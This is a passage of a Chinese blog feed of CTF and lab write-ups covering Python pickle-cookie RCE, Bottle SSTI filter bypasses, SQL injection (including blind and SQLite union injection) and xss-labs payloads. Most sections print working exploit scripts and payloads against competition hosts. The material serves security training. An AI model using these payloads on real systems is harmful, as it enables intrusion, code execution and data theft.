class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import hmac</span><br><span class="line">import base64</span><br><span class="line">def gen_cookie(payload):</span><br><span class="line">    b64pld = base64.b64encode(payload)</span><br><span class="line">    signature = base64.b64encode(</span><br><span class="line">        hmac.new(</span><br><span class="line">            b&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;, b64pld, hashlib.sha256</span><br><span class="line">        ).digest()</span><br><span class="line">    )</span><br><span class="line">    return b&#x27;&quot;!&#x27; + signature + b&quot;?&quot; + b64pld + b&#x27;&quot;&#x27;</span><br><span class="line">data = b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;cat /flag_* &gt; flag&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br><span class="line">print(gen_cookie(data).decode())</span><br></pre></td></tr></table></figure><p>3.运行脚本后将得到的数据传入&#x2F;secret目录里，进行cookie传参name：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=!o6j+MoPMGQB9LT5wVr3HxiwMjPgI5TXTL0mVN3+C4NE=?KGNvcwpzeXN0ZW0KUydjYXQgL2ZsYWdfKiA+IGZsYWcnCm8u</span><br></pre></td></tr></table></figure><p>4.然后通过<code>/download?filename=flag</code>路由进行下载即可</p><p>5.官网wp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from bottle import cookie_encode</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">secret = &quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span><br><span class="line"></span><br><span class="line">class Test:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval, (&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;cp /f* ./2.txt&#x27;)&quot;&quot;&quot;,))</span><br><span class="line"></span><br><span class="line">exp = cookie_encode(</span><br><span class="line">    (&#x27;session&#x27;, &#123;&quot;name&quot;: [Test()]&#125;),</span><br><span class="line">    secret</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">requests.get(&#x27;http://gz.imxbt.cn:20458/secret&#x27;, cookies=&#123;&#x27;name&#x27;: exp.decode()&#125;)</span><br><span class="line"></span><br><span class="line">#访问2.txt直接打到flag。</span><br></pre></td></tr></table></figure><h2 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h2><p>拼图题，首先要把图片拼好</p><p>既然是判断时间，那就去找关键词，搜下<code>time</code>发现了<code>startTime</code>等等，其他的不可控（比如什么<code>endTime</code>），但是如果<code>startTime</code>很大，去和2秒比较肯定没问题，所以控制台修改一下</p><p>最后点击最后一块拼图即可获得flag<br>出题人又疯</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@File    :   app.py</span><br><span class="line">@Time    :   2025/03/29 15:52:17</span><br><span class="line">@Author  :   LamentXU </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import bottle</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">flag in /flag</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@bottle.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;Hello, World!&#x27;</span><br><span class="line">@bottle.route(&#x27;/attack&#x27;)</span><br><span class="line">def attack():</span><br><span class="line">    payload = bottle.request.query.get(&#x27;payload&#x27;)</span><br><span class="line">    if payload and len(payload) &lt; 25 and &#x27;open&#x27; not in payload and &#x27;\\&#x27; not in payload:</span><br><span class="line">        return bottle.template(&#x27;hello &#x27;+payload)</span><br><span class="line">    else:</span><br><span class="line">        bottle.abort(400, &#x27;Invalid payload&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bottle.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure><p>1.审计源码发现&#x2F;attack上存在注入</p><p>2.传入?payload&#x3D;49，结果为49,确定为SSTI</p><p>3.题目要求不能使用open，并且payload长度不能大于25</p><p>4.输入斜体字符来绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">def replace_unquoted(text):</span><br><span class="line">    pattern = r&#x27;(\&#x27;.*?\&#x27;|\&quot;.*?\&quot;)|([oa])&#x27;</span><br><span class="line"></span><br><span class="line">    def replacement(match):</span><br><span class="line">        if match.group(1):</span><br><span class="line">            return match.group(1)</span><br><span class="line">        else:</span><br><span class="line">            char = match.group(2)</span><br><span class="line">            replacements = &#123;</span><br><span class="line">                &#x27;o&#x27;: &#x27;%ba&#x27;,</span><br><span class="line">                &#x27;a&#x27;: &#x27;%aa&#x27;,</span><br><span class="line">            &#125;</span><br><span class="line">            return replacements.get(char, char)</span><br><span class="line"></span><br><span class="line">    result = re.sub(pattern, replacement, text)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">input_text = &#x27;open&#x27; # payload</span><br><span class="line">output_text = replace_unquoted(input_text)</span><br><span class="line">print(&quot;处理后的字符串:&quot;, output_text)</span><br></pre></td></tr></table></figure><p>斜体的o被解析成了%C2%BA</p><p>其实这里是一个URL解码的小坑。一个%BA就足够了。我们删除%C2即可。</p><p>对字符a，同理。替换为%aa</p><p>5.最终构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;%bapen(&#x27;/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>6.官网wp:</p><p>bottle的SSTI可以直接访问到内部类。所以易得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://eci-2zeeal6ndgee1yfe98tl.cloudeci1.ichunqiu.com:5000/attack&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&gt;123&#x27;)&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = [payload[i:i+3] for i in range(0,len(payload),3)]</span><br><span class="line">flag = True</span><br><span class="line">for i in p:</span><br><span class="line">    if flag:</span><br><span class="line">        tmp = f&#x27;\n%import os;os.a=&quot;&#123;i&#125;&quot;&#x27;</span><br><span class="line">        flag = False</span><br><span class="line">    else:</span><br><span class="line">        tmp = f&#x27;\n%import os;os.a+=&quot;&#123;i&#125;&quot;&#x27;</span><br><span class="line">    r = requests.get(url,params=&#123;&quot;payload&quot;:tmp&#125;)</span><br><span class="line"></span><br><span class="line">r = requests.get(url,params=&#123;&quot;payload&quot;:&quot;\n%import os;eval(os.a)&quot;&#125;)</span><br><span class="line">r = requests.get(url,params=&#123;&quot;payload&quot;:&quot;\n%include(&#x27;123&#x27;)&quot;&#125;).text</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure><h2 id="Fate"><a href="#Fate" class="headerlink" title="Fate"></a>Fate</h2><p>考点：json反序列化&amp;python格式化字符串漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import flask</span><br><span class="line">import sqlite3</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">def db_search(code):</span><br><span class="line">    with sqlite3.connect(&#x27;database.db&#x27;) as conn:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(f&quot;SELECT name FROM country WHERE code=UPPER(&#x27;&#123;code&#125;&#x27;)&quot;)</span><br><span class="line">        found = cur.fetchone()</span><br><span class="line">    return None if found is None else found[0]</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return flask.render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/api/search&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def api_search():</span><br><span class="line">    req = flask.request.get_json()</span><br><span class="line">    if &#x27;code&#x27; not in req:</span><br><span class="line">        flask.abort(400, &quot;Empty country code&quot;)</span><br><span class="line"></span><br><span class="line">    code = req[&#x27;code&#x27;]</span><br><span class="line">    if len(code) != 2 or &quot;&#x27;&quot; in code:</span><br><span class="line">        flask.abort(400, &quot;Invalid country code&quot;)</span><br><span class="line"></span><br><span class="line">    name = db_search(code)</span><br><span class="line">    if name is None:</span><br><span class="line">        flask.abort(404, &quot;No such country&quot;)</span><br><span class="line"></span><br><span class="line">    return &#123;&#x27;name&#x27;: name&#125;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个拥有几乎不可能绕过的waf的SQL注入题。</p><p>我们可以看到，这题是利用<code>flask.request.get_json()</code>进行传参，这个方法没有对传入的类型做检查。因此，我们可以传入非字符串类型的变量。</p><p>而在python中，当我们使用f-string直接传入非字符串参数时，就会被强转为字符串。</p><p>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=[1]</span><br><span class="line">print(f&#x27;111&#123;a&#125;&#x27;)</span><br><span class="line">输出：111[1]</span><br></pre></td></tr></table></figure><p>这也被称为<strong>python格式化字符串漏洞</strong>。</p><p>解法一：</p><p>因此，这题可以这样解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:[&quot;1&#x27;) UNION SELECT FLAG FROM FLAG --&quot;,&quot;1&quot;]&#125;</span><br></pre></td></tr></table></figure><p>传入的code为列表，因而可以通过waf（len为2，没有<code>&#39;</code>元素）随后直接被f-string强转，拼入sql语句，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM country WHERE code=UPPER(&#x27;[&quot;1&#x27;) UNION SELECT FLAG FROM FLAG --&quot;,&quot;1&quot;]&#x27;)</span><br></pre></td></tr></table></figure><p>就可以完成一次SQL注入。拿到FLAG表里的FLAG值。</p><h2 id="ezspl"><a href="#ezspl" class="headerlink" title="ezspl"></a>ezspl</h2><p>1.开局即登录，先<code>fuzz</code>看看ban了什么，发现空格、换行符、逗号，union等一堆内容被过滤了，本题主要用到两个：一是使用制表符代替空格，二是用<code>FROM</code>、<code>FOR</code>代替逗号；</p><p>2.判断下注入点，过程省略了，发现是<code>username</code>为字符型注入；</p><p>3.试试万能密码行不行1’%09or%091&#x3D;1%23，好消息是可以，坏消息是还有一层：</p><p>提示需要输入管理员密钥</p><p>4.显然还是要注入，利用布尔盲注直接爆，最后读到<code>secret: dtfrtkcc0czkoua9s</code>，输入后进入命令执行页面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">def inject():</span><br><span class="line">    url = &#x27;http://gz.imxbt.cn:20011/login.php&#x27;</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    char = &#x27;qwertyuiopasdfghjkllzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890_&#x27;</span><br><span class="line"></span><br><span class="line">    for i in range(1, 50):</span><br><span class="line">        for j in char:</span><br><span class="line"></span><br><span class="line">            payload = f&quot;&#x27;or\tsubstr(database()from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><span class="line">            # payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(table_name)from\tinformation_schema.tables\twhere\ttable_schema=&#x27;testdb&#x27;)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><span class="line">            # payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(column_name)\tfrom\tinformation_schema.columns\twhere\ttable_name=&#x27;double_check&#x27;)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><span class="line">            # payload = f&quot;&#x27;or\tsubstr((select\tgroup_concat(secret)\tfrom\tdouble_check)from(&#123;i&#125;)for(1))=&#x27;&#123;j&#125;&#x27;#&quot;</span><br><span class="line"></span><br><span class="line">            data = &#123;&quot;username&quot;: payload, &quot;password&quot;: ddd&#125;</span><br><span class="line">            r = requests.post(url=url, data=data)</span><br><span class="line">            # print(payload)</span><br><span class="line">            # print(r.text)</span><br><span class="line">            if &quot;检测到非法输入,已阻断!&quot; in r.text:</span><br><span class="line">                print(payload)</span><br><span class="line">                break</span><br><span class="line">            if &quot;帐号或密码错误&quot; not in r.text:</span><br><span class="line">                flag += j</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">inject()</span><br></pre></td></tr></table></figure><p>5.无回显，还把空格ban了，直接重定向：<code>cat$&#123;IFS&#125;/flag.txt$&#123;IFS&#125;&gt;flag.txt</code>，然后看文件即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Signin&quot;&gt;&lt;a href=&quot;#Signin&quot; class=&quot;headerlink&quot; title=&quot;Signin&quot;&gt;&lt;/a&gt;Signin&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;来点真正的签到吧！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SQLite 数据库注入总结</title>
    <link href="http://1768161086.github,io/2025/04/05/sqlite/"/>
    <id>http://1768161086.github,io/2025/04/05/sqlite/</id>
    <published>2025-04-05T11:20:55.000Z</published>
    <updated>2025-04-05T11:31:51.653Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQLite-数据库注入总结"><a href="#SQLite-数据库注入总结" class="headerlink" title="SQLite 数据库注入总结"></a>SQLite 数据库注入总结</h1><p>注入show databases发现报错了，又因为show databases只在MySQL中存在，但是在SQLite中无法使用，所以判断为SQLite注入</p><p>注释：可以使用 – 进行注释，也可以使用 &#x2F;* 进行注释</p><h2 id="GHCTF2025WEB-SQL"><a href="#GHCTF2025WEB-SQL" class="headerlink" title="GHCTF2025WEB-SQL???"></a>GHCTF2025WEB-SQL???</h2><p>1.先order by判断有几列</p><p>2.爆出来表名</p><p>&#96;&#96;sqlite_master（相当于MySQL的information_schema）<code> 是 SQLite 中的一个系统表，它存储了数据库中所有对象（如表、视图、索引等）的定义信息。攻击者通过这个函数可以获取数据库中所有对象的名称。</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1 union select 1,2,3,4,group_concat(name) from sqlite_master</span><br></pre></td></tr></table></figure><p> 在name这一列中是所包含的表的名字，也就是flag和users</p><p>3.查表名和列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select 1,2,(select sql from sqlite_master limit 0,1),4,5;</span><br><span class="line">/?id=1 union select 1,2,3,4,group_concat(sql) from sqlite_master</span><br></pre></td></tr></table></figure><p>4.查询数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select 1,2,(select group_concat(flag) from flag),4,5;</span><br></pre></td></tr></table></figure><p>官网wp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,sqlite_version(),(select group_concat(flag) from flag)--</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQLite-数据库注入总结&quot;&gt;&lt;a href=&quot;#SQLite-数据库注入总结&quot; class=&quot;headerlink&quot; title=&quot;SQLite 数据库注入总结&quot;&gt;&lt;/a&gt;SQLite 数据库注入总结&lt;/h1&gt;&lt;p&gt;注入show databases发现报错了，</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>xss</title>
    <link href="http://1768161086.github,io/2025/04/02/xss/"/>
    <id>http://1768161086.github,io/2025/04/02/xss/</id>
    <published>2025-04-02T12:44:42.000Z</published>
    <updated>2025-04-21T08:50:27.625Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-labs靶场实战"><a href="#xss-labs靶场实战" class="headerlink" title="xss-labs靶场实战"></a>xss-labs靶场实战</h1><p><a href="https://so.csdn.net/so/search?q=xss-labs&spm=1001.2101.3001.7020">xss-labs</a>下载地址<a href="https://github.com/do0dl3/xss-labs" title="https:&#x2F;&#x2F;github.com&#x2F;do0dl3&#x2F;xss-labs">GitHub - do0dl3&#x2F;xss-labs: xss 跨站漏洞平台</a></p><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?name=&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="1-html实体转义"><a href="#1-html实体转义" class="headerlink" title="1.html实体转义"></a>1.html实体转义</h2><p>但是第二个没有，我们只需要闭合掉双引号即可，构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;  &lt;script&gt;alert()&lt;/script&gt;  &lt;&quot;</span><br></pre></td></tr></table></figure><h2 id="2-符号也被实体化"><a href="#2-符号也被实体化" class="headerlink" title="2.符号也被实体化"></a>2.符号也被实体化</h2><p>,但是htmlspecialchars函数只针对&lt;&gt;大于小于号进行html实体化，我们还可以利用其他方法进行xss注入，这里我们可以利用<strong>onfocus事件绕过</strong></p><p><code>onfocus事件在元素获得焦点时触发，最常与 &lt;input&gt;、&lt;select&gt; 和 &lt;a&gt; 标签一起使用，以上面图片的html标签&lt;input&gt;为例，&lt;input&gt;标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发myFunction()函数，然后我们再配合javascript伪协议来执行javascript代码</code></p><p>所以我们可以利用这个事件来绕过&lt;&gt;号的过滤已达到执行js的目的，构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onfocus=javascript:alert() &#x27;</span><br></pre></td></tr></table></figure><h2 id="3-双引号闭合"><a href="#3-双引号闭合" class="headerlink" title="3.双引号闭合"></a>3.双引号闭合</h2><p><input>标签，所以我们还能继续利用onfocus事件，构建payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=javascript:alert() &quot;</span><br></pre></td></tr></table></figure><h2 id="4-on被替换成了o-n"><a href="#4-on被替换成了o-n" class="headerlink" title="4.on被替换成了o_n"></a>4.on被替换成了o_n</h2><p>大小写无法来绕过过滤，使用href标签法</p><p>href属性的意思是 当标签<a>被点击的时候，就会触发执行转跳，上面是转跳到一个网站，我们还可以触发执行一段js代码</a></p><p>添加一个标签得闭合前面的标签，构建payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><h2 id="5-大小写没有被过滤"><a href="#5-大小写没有被过滤" class="headerlink" title="5.大小写没有被过滤"></a>5.大小写没有被过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot;</span><br><span class="line">&quot; Onfocus=javascript:alert() &quot;</span><br><span class="line">&quot;&gt; &lt;a hRef=javascript:alert()&gt;x&lt;/a&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><h2 id="6-禁用on，script，href"><a href="#6-禁用on，script，href" class="headerlink" title="6.禁用on，script，href"></a>6.禁用on，script，href</h2><p>所以这关主要是双拼写绕过，方法有很多，这里我们用href属性标签，构造play</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a hrehreff=javasscriptcript:alert()&gt;x&lt;/a&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><h2 id="7-滤掉src和data"><a href="#7-滤掉src和data" class="headerlink" title="7.滤掉src和data"></a>7.滤掉src和data</h2><ul><li><strong>src</strong>(source)是一个指向，可以大概理解跟href一样把，只是执行的内容不太一样</li><li><strong>data</strong>一般在<iframe>标签中用来配合date:text&#x2F;html（貌似解码的含义）</iframe></li></ul><p>试一下src这里配合<strong>onerror属性</strong>，插入一个img标签闭合掉双引号跟括号，构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;img src=&#x27;666&#x27; onerror=alert()&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><p><code>onerror属性是指当图片加载不出来的时候触发js函数，以上面的代码为例，这里因为src指向的是值666，而不是图片的地址和base64编码啥的，就会导致触发alert函数</code></p><h3 id="img标签还有其他姿势"><a href="#img标签还有其他姿势" class="headerlink" title="img标签还有其他姿势"></a>img标签还有其他姿势</h3><h4 id="当鼠标移出图片的时候执行的属性onmouseout"><a href="#当鼠标移出图片的时候执行的属性onmouseout" class="headerlink" title="当鼠标移出图片的时候执行的属性onmouseout"></a>当鼠标移出图片的时候执行的属性<strong>onmouseout</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;img src=666 onmouseout=&quot;alert()&quot;&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><h4 id="当鼠标移动到图片的时候执行的属性onmouseover"><a href="#当鼠标移动到图片的时候执行的属性onmouseover" class="headerlink" title="当鼠标移动到图片的时候执行的属性onmouseover"></a>当鼠标移动到图片的时候执行的属性<strong>onmouseover</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;img src=1 onmouseover=&quot;alert()&quot;&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><p>再来看看data的，这里利用iframe标签，插入一个标签<strong>data:text&#x2F;html;base64,</strong> 将后面的内容进行base64解码，PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+进行base64解码后是<script>alert()</script></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+&quot;&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><h2 id="8-过滤双引号"><a href="#8-过滤双引号" class="headerlink" title="8.过滤双引号"></a>8.过滤双引号</h2><p>利用href的隐藏属性自动Unicode解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41; ==javascript:alert()</span><br></pre></td></tr></table></figure><h2 id="9-strpos绕过"><a href="#9-strpos绕过" class="headerlink" title="9.strpos绕过"></a>9.strpos绕过</h2><p>需要向传入的值里面添加http:&#x2F;&#x2F;并用注释符注释掉否则会执行不了无法弹窗，让函数strpos返回一个数字，构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */</span><br></pre></td></tr></table></figure><h2 id="10-过滤掉了号"><a href="#10-过滤掉了号" class="headerlink" title="10.过滤掉了&lt;&gt;号"></a>10.过滤掉了&lt;&gt;号</h2><p>用onfocus事件，因为这里输入框被隐藏了，需要添加type&#x3D;”text”，构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure><p>构造一个http头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure><p>构造UA头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure><p>伪造cookie头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert() type=&quot;text </span><br></pre></td></tr></table></figure><h2 id="11-过滤JavaScript"><a href="#11-过滤JavaScript" class="headerlink" title="11.过滤JavaScript"></a>11.过滤JavaScript</h2><p>我们需通过<code>HTML</code>实体编码或<code>Unicode</code>绕过<br>因为浏览器会自动解码<code>HTML</code>实体或<code>Unicode</code>字符，最终执行原始代码。<br>构造<code>payload1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#x74;:alert(1)（`t`的十六进制编码，点击链接弹窗）</span><br><span class="line">构造payload2</span><br><span class="line">使用Unicode编码：</span><br><span class="line">javasc&amp;#x0072;ipt:alert(1)</span><br></pre></td></tr></table></figure><h2 id="12-过滤script标签"><a href="#12-过滤script标签" class="headerlink" title="12.过滤script标签"></a>12.过滤script标签</h2><p>但是可以包涵那些标签的东西比如<a>、<input>、img、<p>标签等等</p><figure class="highlight plaintext"><table><tr><td 